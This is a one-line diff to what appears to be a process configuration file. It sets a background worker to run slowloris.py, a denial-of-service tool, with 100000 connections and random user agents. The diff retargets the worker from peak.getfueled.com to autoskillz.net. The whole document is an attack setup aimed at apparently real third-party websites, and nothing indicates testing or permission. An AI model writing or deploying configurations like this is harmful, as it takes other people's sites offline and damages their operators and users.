@@ -1,1 +1,1 @@
-worker: python3 slowloris.py https://peak.getfueled.com/ -ua -s 100000 --https
+worker: python3 slowloris.py autoskillz.net -ua -s 100000
